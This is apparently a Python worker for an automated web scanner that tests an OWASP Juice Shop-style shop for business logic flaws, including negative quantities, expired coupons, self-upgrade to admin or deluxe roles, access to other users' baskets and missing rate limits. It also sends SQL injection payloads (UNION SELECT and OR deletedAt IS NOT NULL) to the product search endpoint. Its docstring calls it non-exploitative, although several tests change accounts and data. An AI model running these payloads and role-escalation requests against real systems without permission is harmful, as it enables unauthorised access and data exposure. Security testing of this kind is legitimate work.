"""
Business Logic Testing Worker
===============================
Phase: DAST  (non-exploitative — tests input validation, not system state)
Queue: scan.dast.bizlogic

What this worker tests
-----------------------
Business logic vulnerabilities are flaws in the application's design that allow
attackers to bypass intended functionality.  Unlike injection attacks, they don't
require special payloads — just unexpected but syntactically valid values.

  Test 1 — Negative quantity / price (Payback Time)
    PUT /api/BasketItems/:id {"quantity": -100}
    If accepted: ordering items with negative quantity gives money back.

  Test 2 — Zero-star feedback (Zero Stars)
    POST /api/Feedbacks {"rating": 0, "comment": "briar-probe"}
    The UI enforces rating ≥ 1 client-side, but the API may not.

  Test 3 — Empty user registration (Empty User Registration)
    POST /api/Users {"email": "", "password": ""}
    Checks whether server enforces non-empty credentials.

  Test 4 — Expired coupon (Expired Coupon)
    POST checkout with known expired Juice Shop coupon codes.
    If accepted: discount applied past expiry date.

  Test 5 — Deluxe membership bypass (Deluxe Fraud)
    PUT /api/Users/:id {"isDeluxe": true, "role": "deluxe"}
    Mass-assignment via authenticated user endpoint.

  Test 6 — Rate limiting on registration (Repetitive Registration)
    POST /api/Users 15 times in 5 seconds — if all succeed, no rate limit.

  Test 7 — Order manipulation (Manipulate Basket)
    PUT /api/BasketItems/:id with another user's basket ID.
"""

import asyncio
import logging
import os
import sys
import time
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse

import httpx

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../../")))

from shared.worker_base import BaseWorker
from shared.models import SeverityLevel

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)-8s | %(name)s | %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger("bizlogic-worker")

REQUEST_TIMEOUT = float(os.getenv("BIZLOGIC_REQUEST_TIMEOUT", "10"))
TOTAL_TIMEOUT   = int(os.getenv("BIZLOGIC_TOTAL_TIMEOUT",    "600"))

# Known expired Juice Shop coupon codes (documented in challenge hints)
_EXPIRED_COUPONS = [
    "HAPPY22",
    "WMNSDY2019",
    "WMNSDY2020",
    "ORANGE2020",
    "JUICY2019",
    "BDAY2019",
    "XMAS2019",
    "JUICESHOP",
    "TESTCOUPON",
]

# ── Helpers ───────────────────────────────────────────────────────────────────

def _base_origin(url: str) -> str:
    p = urlparse(url)
    port = f":{p.port}" if p.port else ""
    return f"{p.scheme}://{p.hostname}{port}"


def _build_cookie_str(cookies: List[Dict]) -> str:
    return "; ".join(f"{c['name']}={c['value']}" for c in cookies if c.get("name"))


def _finding(
    url: str,
    vuln_type: str,
    severity: SeverityLevel,
    description: str,
    evidence: str,
    owasp: str = "A04:2021 – Insecure Design",
) -> Dict[str, Any]:
    return {
        "url":              url,
        "type":             vuln_type,
        "description":      description,
        "severity":         severity,
        "vulnerability_type": vuln_type,
        "has_params":       True,
        "raw_output": {
            "evidence": evidence,
            "owasp":    owasp,
            "source":   "bizlogic-worker",
        },
    }


class BizLogicWorker(BaseWorker):
    def __init__(self):
        super().__init__(tool_name="bizlogic", queue_name="scan.dast.bizlogic")

    async def execute_tool(
        self,
        target: str,
        auth_context: Dict[str, Any],
        task_payload: Dict[str, Any],
    ) -> List[Dict[str, Any]]:

        origin = _base_origin(target)
        cookies: List[Dict] = auth_context.get("cookies", [])
        raw_headers: Dict[str, str] = auth_context.get("headers", {})

        auth_headers: Dict[str, str] = {
            k: v for k, v in raw_headers.items()
            if k.lower() not in ("content-type",)
        }
        cookie_str = _build_cookie_str(cookies)
        if cookie_str:
            auth_headers["Cookie"] = cookie_str

        json_headers = {**auth_headers, "Content-Type": "application/json"}

        results: List[Dict[str, Any]] = []

        async with httpx.AsyncClient(
            verify=False,
            follow_redirects=True,
            timeout=REQUEST_TIMEOUT,
        ) as client:

            # ── Test 1: Negative quantity ─────────────────────────────────────
            logger.info("[bizlogic] Test 1: negative quantity in basket")
            r = await self._test_negative_quantity(client, origin, json_headers)
            if r:
                results.append(r)

            # ── Test 2: Zero-star feedback ────────────────────────────────────
            logger.info("[bizlogic] Test 2: zero-star feedback")
            r = await self._test_zero_stars(client, origin, json_headers)
            if r:
                results.append(r)

            # ── Test 3: Empty user registration ───────────────────────────────
            logger.info("[bizlogic] Test 3: empty registration")
            r = await self._test_empty_registration(client, origin, json_headers)
            if r:
                results.append(r)

            # ── Test 4: Expired coupon ────────────────────────────────────────
            logger.info("[bizlogic] Test 4: expired coupon codes")
            r = await self._test_expired_coupon(client, origin, json_headers)
            if r:
                results.append(r)

            # ── Test 5: Deluxe membership mass-assignment ─────────────────────
            logger.info("[bizlogic] Test 5: deluxe fraud via mass assignment")
            r = await self._test_deluxe_fraud(client, origin, json_headers)
            if r:
                results.append(r)

            # ── Test 6: Repetitive registration (rate limit) ──────────────────
            logger.info("[bizlogic] Test 6: repetitive registration")
            r = await self._test_repetitive_registration(client, origin, json_headers)
            if r:
                results.append(r)

            # ── Test 7: Christmas Special (M24) ──────────────────────────────
            logger.info("[bizlogic] Test 7: Christmas Special — order deleted item")
            r = await self._test_christmas_special(client, origin, json_headers)
            if r:
                results.append(r)

            # ── Test 8: BOLA — access other users' basket ─────────────────────
            logger.info("[bizlogic] Test 8: BOLA — access another user's basket")
            r = await self._test_bola_basket(client, origin, json_headers)
            if r:
                results.append(r)

            # ── Test 9: Admin section access without role check ───────────────
            logger.info("[bizlogic] Test 9: admin section access")
            r = await self._test_admin_section(client, origin, json_headers)
            if r:
                results.append(r)

        logger.info(f"[bizlogic] Done — {len(results)} finding(s)")
        return results

    # ── Test implementations ──────────────────────────────────────────────────

    async def _test_negative_quantity(
        self,
        client: httpx.AsyncClient,
        origin: str,
        headers: Dict[str, str],
    ) -> Optional[Dict[str, Any]]:
        """Try to add item with negative quantity to basket."""
        for basket_item_id in range(1, 10):
            url = f"{origin}/api/BasketItems/{basket_item_id}"
            try:
                resp = await client.put(url, json={"quantity": -100}, headers=headers)
                if resp.status_code in (200, 201, 204):
                    logger.info(f"[bizlogic] Negative quantity accepted on {url}")
                    return _finding(
                        url, "negative_quantity", SeverityLevel.high,
                        "Business logic flaw: negative quantity accepted in basket (Payback Time)",
                        f"PUT {url} {{quantity: -100}} → HTTP {resp.status_code}: "
                        f"order total becomes negative, giving attacker store credit",
                    )
            except Exception as e:
                logger.debug(f"[bizlogic] Negative qty {url}: {e}")
        return None

    async def _test_zero_stars(
        self,
        client: httpx.AsyncClient,
        origin: str,
        headers: Dict[str, str],
    ) -> Optional[Dict[str, Any]]:
        """Submit feedback with rating=0 (below UI minimum of 1)."""
        url = f"{origin}/api/Feedbacks"
        try:
            resp = await client.post(
                url,
                json={"comment": "briar-bizlogic-probe", "rating": 0,
                      "captchaId": 0, "captcha": ""},
                headers=headers,
            )
            if resp.status_code in (200, 201):
                logger.info(f"[bizlogic] Zero-star feedback accepted")
                return _finding(
                    url, "zero_stars", SeverityLevel.low,
                    "Business logic flaw: zero-star feedback accepted (bypasses client-side minimum)",
                    f"POST {url} {{rating: 0}} → HTTP {resp.status_code}: "
                    f"client-side validation not enforced server-side",
                )
        except Exception as e:
            logger.debug(f"[bizlogic] Zero stars: {e}")
        return None

    async def _test_empty_registration(
        self,
        client: httpx.AsyncClient,
        origin: str,
        headers: Dict[str, str],
    ) -> Optional[Dict[str, Any]]:
        """Register with empty email and password."""
        for reg_path in ("/api/Users", "/register", "/api/register"):
            url = f"{origin}{reg_path}"
            try:
                resp = await client.post(
                    url,
                    json={"email": "", "password": "", "passwordRepeat": ""},
                    headers=headers,
                )
                if resp.status_code in (200, 201):
                    logger.info(f"[bizlogic] Empty registration accepted on {url}")
                    return _finding(
                        url, "empty_registration", SeverityLevel.medium,
                        "Business logic flaw: user registration accepted with empty email and password",
                        f"POST {url} {{email:'', password:''}} → HTTP {resp.status_code}: "
                        f"no server-side input validation on required fields",
                    )
            except Exception as e:
                logger.debug(f"[bizlogic] Empty registration {url}: {e}")
        return None

    async def _test_expired_coupon(
        self,
        client: httpx.AsyncClient,
        origin: str,
        headers: Dict[str, str],
    ) -> Optional[Dict[str, Any]]:
        """Try applying known expired coupon codes at checkout."""
        # First add something to basket
        basket_resp = None
        for prod_id in range(1, 4):
            try:
                r = await client.post(
                    f"{origin}/api/BasketItems",
                    json={"ProductId": prod_id, "BasketId": 1, "quantity": 1},
                    headers=headers,
                )
                if r.status_code in (200, 201):
                    basket_resp = r
                    break
            except Exception:
                pass

        for coupon in _EXPIRED_COUPONS:
            for apply_path in ("/rest/basket/1/coupon", "/api/Orders/coupon",
                               "/coupon", "/api/coupon"):
                url = f"{origin}{apply_path}/{coupon}"
                try:
                    resp = await client.get(url, headers=headers)
                    if resp.status_code == 200 and "discount" in resp.text.lower():
                        logger.info(f"[bizlogic] Expired coupon {coupon!r} accepted on {url}")
                        return _finding(
                            url, "expired_coupon", SeverityLevel.medium,
                            f"Business logic flaw: expired coupon {coupon!r} accepted at checkout",
                            f"GET {url} → HTTP {resp.status_code}: "
                            f"expired coupon still gives discount",
                        )
                except Exception as e:
                    logger.debug(f"[bizlogic] Coupon {coupon} {url}: {e}")
        return None

    async def _test_deluxe_fraud(
        self,
        client: httpx.AsyncClient,
        origin: str,
        headers: Dict[str, str],
    ) -> Optional[Dict[str, Any]]:
        """Try to self-upgrade to deluxe membership via PUT /api/Users/:id."""
        # Try user IDs 1-5
        for user_id in range(1, 6):
            url = f"{origin}/api/Users/{user_id}"
            for payload in [
                {"isDeluxe": True},
                {"role": "deluxe"},
                {"deluxeToken": "deluxe2020"},
                {"isAdmin": True, "role": "admin"},
            ]:
                try:
                    resp = await client.put(url, json=payload, headers=headers)
                    if resp.status_code in (200, 201, 204):
                        body = resp.text.lower()
                        if any(k in body for k in ("deluxe", "admin", "role")):
                            logger.info(f"[bizlogic] Deluxe fraud accepted: {url}")
                            return _finding(
                                url, "privilege_escalation", SeverityLevel.critical,
                                "Business logic flaw: self-upgrade to privileged role accepted",
                                f"PUT {url} {payload} → HTTP {resp.status_code}: "
                                f"user can modify their own role/membership",
                                "A01:2021 – Broken Access Control",
                            )
                except Exception as e:
                    logger.debug(f"[bizlogic] Deluxe fraud {url}: {e}")
        return None

    async def _test_repetitive_registration(
        self,
        client: httpx.AsyncClient,
        origin: str,
        headers: Dict[str, str],
    ) -> Optional[Dict[str, Any]]:
        """Send 12 registration requests within 5 seconds — detect missing rate limit."""
        import random
        import string
        url = f"{origin}/api/Users"
        tasks = []
        for i in range(12):
            rnd = "".join(random.choices(string.ascii_lowercase, k=8))
            tasks.append(
                client.post(
                    url,
                    json={"email": f"briar_rate_{rnd}@probe.invalid",
                          "password": "Probe1234!", "passwordRepeat": "Probe1234!"},
                    headers=headers,
                    timeout=6,
                )
            )
        t0 = time.monotonic()
        try:
            responses = await asyncio.gather(*tasks, return_exceptions=True)
        except Exception:
            return None
        elapsed = time.monotonic() - t0

        ok_count = sum(
            1 for r in responses
            if isinstance(r, httpx.Response) and r.status_code in (200, 201)
        )
        if ok_count >= 10 and elapsed < 6:
            logger.info(f"[bizlogic] Rate limit missing on {url}: {ok_count}/12 succeeded in {elapsed:.1f}s")
            return _finding(
                url, "missing_rate_limit", SeverityLevel.medium,
                f"Missing rate limiting on user registration: {ok_count}/12 requests succeeded in {elapsed:.1f}s",
                f"12 parallel POST {url} requests: {ok_count} returned 200/201 within {elapsed:.1f}s",
                "A05:2021 – Security Misconfiguration",
            )
        return None


    async def _test_christmas_special(
        self,
        client: httpx.AsyncClient,
        origin: str,
        headers: Dict[str, str],
    ) -> Optional[Dict[str, Any]]:
        """
        M24 — Christmas Special challenge:
        Order the "Christmas Super-Surprise-Box (2014 Edition)" which was
        removed from the shop (deletedAt IS NOT NULL in Products table).

        Attack vector:
          1. SQLi via product search: inject ' OR deletedAt IS NOT NULL-- into
             /rest/products/search?q= to expose soft-deleted products
          2. If the deleted item appears, try to add it to basket via API
          3. If it can be added, the server lacks a deletion guard → confirmed

        Juice Shop product IDs: the Christmas item is typically product ID 10.
        We probe both SQLi discovery and direct API access.
        """
        url_base = origin

        # ── Step 1: SQLi to find deleted product ──────────────────────────────
        sqli_payloads = [
            "christmas%27%20UNION%20SELECT%20*%20FROM%20Products%20WHERE%20deletedAt%20IS%20NOT%20NULL--",
            "christmas'%20OR%20deletedAt%20IS%20NOT%20NULL--",
            "' OR deletedAt IS NOT NULL--",
            "qwert' UNION SELECT id,name,description,price,imgUrl,file,type,deletedAt,createdAt,updatedAt,ProductId FROM Products WHERE deletedAt IS NOT NULL--",
        ]
        deleted_product_id: Optional[int] = None
        deleted_product_name = ""

        for payload in sqli_payloads:
            try:
                r = await client.get(
                    f"{url_base}/rest/products/search?q={payload}",
                    headers=headers,
                    timeout=8,
                )
                if r.status_code == 200:
                    body = r.json()
                    products = body.get("data", [])
                    for p in products:
                        if p.get("deletedAt") or "christmas" in (p.get("name") or "").lower():
                            deleted_product_id = p.get("id")
                            deleted_product_name = p.get("name", "unknown")
                            logger.info(
                                f"[bizlogic/xmas] SQLi revealed deleted product: "
                                f"id={deleted_product_id} name={deleted_product_name!r}"
                            )
                            break
                if deleted_product_id:
                    break
            except Exception as e:
                logger.debug(f"[bizlogic/xmas] SQLi probe failed: {e}")

        # ── Step 2: Also probe known product IDs directly ─────────────────────
        # In case SQLi didn't find it but direct API access works
        if not deleted_product_id:
            for pid in [10, 9, 11, 12, 13]:
                try:
                    r = await client.get(
                        f"{url_base}/api/Products/{pid}",
                        headers={**headers, "X-Briar-Probe": "christmas-special"},
                        timeout=5,
                    )
                    if r.status_code == 200:
                        try:
                            p = r.json().get("data", {})
                            if p.get("deletedAt") or "christmas" in (p.get("name") or "").lower():
                                deleted_product_id = pid
                                deleted_product_name = p.get("name", f"Product {pid}")
                        except Exception:
                            pass
                    if deleted_product_id:
                        break
                except Exception:
                    continue

        if not deleted_product_id:
            logger.debug("[bizlogic/xmas] Christmas Special: no deleted product found")
            return None

        # ── Step 3: Try to add the deleted product to basket ──────────────────
        try:
            r = await client.post(
                f"{url_base}/api/BasketItems",
                json={"ProductId": deleted_product_id, "BasketId": 1, "quantity": 1},
                headers=headers,
                timeout=6,
            )
            if r.status_code in (200, 201):
                logger.info(
                    f"[bizlogic/xmas] Christmas Special CONFIRMED: "
                    f"deleted product {deleted_product_name!r} (id={deleted_product_id}) "
                    "added to basket"
                )
                return _finding(
                    f"{url_base}/api/BasketItems",
                    "christmas_special",
                    SeverityLevel.high,
                    (
                        f"Christmas Special: soft-deleted product {deleted_product_name!r} "
                        f"(ProductId={deleted_product_id}) was added to basket via API — "
                        "no server-side deletion guard on basket add endpoint. "
                        "Order of unavailable items is possible."
                    ),
                    (
                        f"SQLi in /rest/products/search?q= revealed deleted product "
                        f"id={deleted_product_id}; POST /api/BasketItems returned "
                        f"HTTP {r.status_code}"
                    ),
                    "A04:2021 – Insecure Design",
                )
        except Exception as e:
            logger.debug(f"[bizlogic/xmas] Basket add failed: {e}")

        # Product found via SQLi but couldn't be added — still a SQLi finding worth reporting
        return _finding(
            f"{url_base}/rest/products/search",
            "sqli_deleted_product_disclosure",
            SeverityLevel.high,
            (
                f"SQL Injection in /rest/products/search?q= revealed soft-deleted product "
                f"{deleted_product_name!r} (id={deleted_product_id}) — "
                "deletedAt IS NOT NULL records exposed via UNION/OR injection."
            ),
            f"Payload exposed product with deletedAt set: id={deleted_product_id}",
            "A03:2021 – Injection (SQL Injection)",
        )


    async def _test_bola_basket(
        self,
        client: httpx.AsyncClient,
        origin: str,
        headers: Dict[str, str],
    ) -> Optional[Dict[str, Any]]:
        """
        BOLA (Broken Object Level Authorization): access another user's basket.
        Juice Shop: GET /rest/basket/:id returns any basket, even for other users.
        Test by reading basket IDs 2-5 without owning them.
        """
        for basket_id in range(2, 6):
            url = f"{origin}/rest/basket/{basket_id}"
            try:
                resp = await client.get(url, headers=headers)
                if resp.status_code == 200:
                    try:
                        data = resp.json()
                        products = data.get("data", {}).get("Products", [])
                        if isinstance(products, list):
                            logger.info(
                                f"[bizlogic/bola] Basket {basket_id} accessible: "
                                f"{len(products)} item(s)"
                            )
                            return _finding(
                                url, "bola_basket", SeverityLevel.high,
                                (
                                    f"BOLA: unauthenticated/unprivileged access to basket "
                                    f"id={basket_id} — returned {len(products)} product(s) "
                                    "belonging to another user"
                                ),
                                f"GET {url} → HTTP 200 with Products list",
                                "A01:2021 – Broken Access Control",
                            )
                    except Exception:
                        pass
            except Exception as e:
                logger.debug(f"[bizlogic/bola] Basket {basket_id}: {e}")
        return None

    async def _test_admin_section(
        self,
        client: httpx.AsyncClient,
        origin: str,
        headers: Dict[str, str],
    ) -> Optional[Dict[str, Any]]:
        """
        Test whether the /administration SPA route returns admin-only data via REST
        even without admin role in the JWT.
        Juice Shop: GET /api/Users returns all users for any authenticated user.
        """
        admin_api_paths = [
            "/api/Users",        # lists all registered users
            "/api/Feedbacks",    # lists all feedback (admin-only in UI)
        ]
        for path in admin_api_paths:
            url = f"{origin}{path}"
            try:
                resp = await client.get(url, headers=headers)
                if resp.status_code == 200:
                    try:
                        data = resp.json()
                        items = data.get("data", [])
                        if isinstance(items, list) and len(items) > 1:
                            logger.info(
                                f"[bizlogic/admin] {path} returned {len(items)} items "
                                "without admin role check"
                            )
                            return _finding(
                                url, "missing_admin_role_check", SeverityLevel.high,
                                (
                                    f"Missing admin role check: {path} returned "
                                    f"{len(items)} records without admin privileges — "
                                    "all user emails / feedback data exposed"
                                ),
                                f"GET {url} → HTTP 200, {len(items)} records in data[]",
                                "A01:2021 – Broken Access Control",
                            )
                    except Exception:
                        pass
            except Exception as e:
                logger.debug(f"[bizlogic/admin] {path}: {e}")
        return None


async def main():
    worker = BizLogicWorker()
    await worker.start()
    try:
        while worker.running:
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        await worker.shutdown()


if __name__ == "__main__":
    asyncio.run(main())
